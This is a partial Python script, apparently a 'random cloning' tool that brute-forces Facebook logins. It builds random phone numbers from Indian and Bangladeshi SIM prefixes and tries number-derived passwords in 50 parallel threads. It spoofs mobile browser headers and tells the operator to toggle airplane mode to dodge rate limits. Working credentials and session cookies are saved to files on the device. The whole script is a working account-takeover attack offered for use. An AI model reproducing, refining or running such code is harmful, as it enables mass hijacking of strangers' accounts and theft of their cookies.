...
os.system('touch /sdcard/LIVE-OK.txt')
try:
    import requests
...
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m CREATED BY\33[0;m   :  \033[1;96m Danish Hkr
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m FACEBOK      : \033[1;34m Not Found 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m GITHUB       :  \033[1;35m DanishHacker420      
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL STATUS  : \033[1;36m Free   
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM         :  \033[1;35m Danish Army                 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VIRSION :  \033[1;36m 1.1                   
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
...
def Main():
	...
	print(logo)
	print(50*'_')
	print(' [01] Random India Cloning ')
	print(' [02] Random Bangladesh Cloning ')
	print(50*'_')
	ssinp = input(' [★] Choice : ')
	if ssinp in ['1','01']:
		ind()
...
def bd():
    ...
    print(logo)
    shoha()
    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}6353,9122,7697,8140,9827,8295{x}')
    shoha()
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m WORK CUNTRY \033[1;97m: \033[1;96mINDIA + Bangladesh')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 20 SECONDS ')
        shoha()
        for love in user:
            pwx = [love[1:]]
            uid = code+love
...
def ind():
	...
	print(logo)
	print(50*'_')
	print(' [★] Sim code Example : 9817, 8836, 8850, 9697')
	code = input(' [★] Sim Code : ')
	print(50*'_')
	print(' [★] Cracking Limite Example : 1000, 5000, 10000')
	limt = int(input(' [★] Cracking limite : '))
	for nmbr in range(limt):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with ThreadPool(max_workers=50) as SRXX:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(50*'_')
		...
		print(' [★] Use airplane mode every 2 minute ')
		print(50*'_')
		for psx in user:
			uid = '+91'+code+psx
			pwx = [code+psx,psx,code+psx[:4],code[2:]+psx,'57273200','57575751']
			#pwx = [psx]
			SRXX.submit(rcrack,uid,pwx,tl)
#mbasic.facebook.com
#free.facebook.com
#p.facebook.com
#x.facebook.com
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=d-VxZUfNFFIGGVZEcnoiid1A; sb=d-VxZTsVZLpyj9gURMKdCei6; locale=en_US; vpd=v1%3B798x420x3; wl_cbv=v2%3Bclient_version%3A2374%3Btimestamp%3A1701963216; m_pixel_ratio=3; wd=420x798; fr=0U9luhHE1Bd68UjdW.AWU43BD0DlNDiSu25ZU8cC9Ay_g.BlceV3.4m.AAA.0.0.BlcebZ.AWXp2RewhfI',
    'dpr': '3',
    'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfdtV2bnDA2jvmJkYZJ_BG0dkNDVbtak9p-TYAtlmaYfzKe9UpdnRAeTQvloHaJqaBLDj8DzFO0my0GpFqUkg9pkWNEqiRV2aQydA-4dKwZq4Q&smuh=53731&lh=Ac9zOqA7zoBNa_BdQK8&wtsid=rdr_0LuqHSiL35P4wZe7I&refid=8&hide_dialog=1&refsrc=deprecated&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"V2250"',
    ...
    'sec-fetch-user': '?1',
    'service-worker-navigation-preload': '{"k":"rev,1010270703;locale,en_US;cohort,BP:DEFAULT;branch,trunk;dpr,1;features,;u,100091439918932;","a":"1701963174","t":31536000,"n":"Odd5sDe0","v":"2374","p":4,"r":1010270703,"o":"h2","y":"wblt"}',
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/LIVE-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\r\r\33[1;31m [DEATH-CP💔] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                #print(coki)
                open('/sdcard/DEATH-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
